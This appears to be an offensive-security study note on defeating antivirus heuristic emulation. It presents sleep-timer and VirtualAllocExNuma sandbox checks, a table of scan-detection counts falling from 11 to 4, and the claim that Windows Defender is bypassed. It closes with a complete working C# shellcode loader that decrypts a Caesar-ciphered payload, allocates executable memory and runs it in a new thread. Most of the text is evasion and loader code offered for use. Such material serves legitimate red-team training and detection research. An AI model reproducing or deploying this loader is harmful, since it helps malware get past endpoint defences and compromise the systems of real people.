# Messing with Our Behavior

Modern antivirus (AV) products use **heuristic detection** in addition to signatures.

- **Signature detection**: Matches known byte patterns.
- **Heuristic detection**: Simulates program execution in a sandbox/emulator to detect suspicious behavior.

To bypass heuristics, malware/stagers must:

1. **Behave differently** in an emulator vs. a real system.
2. Detect simulation, then safely exit before running suspicious code.

### Technique 1: Sleep Timer Evasion

### Concept:

- AV emulators **fast-forward** through time delays (e.g., `Sleep`) to avoid waiting.
- By measuring **real elapsed time**, malware can detect if execution was emulated.

### Example:

C# Shellcode Runner modified with `Sleep`:

```csharp
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);

static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;

    Sleep(2000);  // request 2s delay

    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

    if (t2 < 1.5)  // emulator fast-forwarded
    {
        return; // exit safely, don’t run payload
    }

    // otherwise, continue with malicious code...
}
```

- Uses `DateTime.Now` and `Subtract()` to measure elapsed time.
- If <1.5s → likely emulator → quit early.
- If >1.5s → real host → continue payload.

### Results:

- Using **unencrypted shellcode runner** → 11 AV engines detected (same as baseline).
- Combining **Sleep timer + Caesar cipher encryption** → only 6 detections.
    - ✅ Successfully bypassed **Windows Defender**.

### Technique 2: Non-Emulated APIs

### Concept:

- AV emulators don’t fully implement all Win32 APIs.
- Some obscure APIs fail inside emulators, but work on real machines.
- Malware can call such APIs → if they fail → assume emulation → exit safely.

### Example: `VirtualAllocExNuma`

Two function prototypes:

```c
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

LPVOID VirtualAllocExNuma(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect,
  DWORD  nndPreferred
);

```

C# Import (`DllImport`):

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(
    IntPtr hProcess, IntPtr lpAddress, uint dwSize,
    UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();
```

Usage in Shellcode Runner:

```csharp
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(),
    IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

if (mem == IntPtr.Zero)
{
    return; // emulator failed → exit
}

```

- Works like `VirtualAllocEx`, but with NUMA optimization (rarely used).
- AV emulator often fails → returns `NULL`.
- If failure → assume sandbox → exit.
- On real host → succeeds → continue with payload.

### Results:

- With **Caesar cipher + VirtualAllocExNuma check** → only **4 detections** left on AntiScan.me.
- ✅ Stronger bypass than Sleep alone.

### 📊 Comparison of Results
| Technique | Detections (AntiScan.me) |
| --- | --- |
| Plain C# shellcode runner | 11 / 26 |
| Caesar cipher (encrypted shellcode) | 7 / 26 |
| Caesar cipher + Sleep timer check | 6 / 26 |
| Caesar cipher + VirtualAllocExNuma | 4 / 26 |


# Full code 
**with Caesar cipher (encrypted shellcode) +  Sleep timer check + VirtualAllocExNuma**
```csharp
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // Win32 API imports
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;

            Sleep(2000);  // request 2s delay

            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

            if (t2 < 1.5)  // emulator fast-forwarded
            {
                return; // exit safely, don’t run payload
            }
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(),
                IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

            if (mem == IntPtr.Zero)
            {
                return; // emulator failed → exit
            }


            //  Encrypted shellcode (from Helper app)
            byte[] buf = new byte[] {
                0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02,....
            };

            //  Decrypt shellcode at runtime (Caesar Cipher, key=2)
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            //  Allocate memory for shellcode
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length,
                0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

            //  Copy decrypted shellcode into memory
            Marshal.Copy(buf, 0, addr, buf.Length);

            //  Create thread to run shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            //  Wait indefinitely for shellcode execution
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```
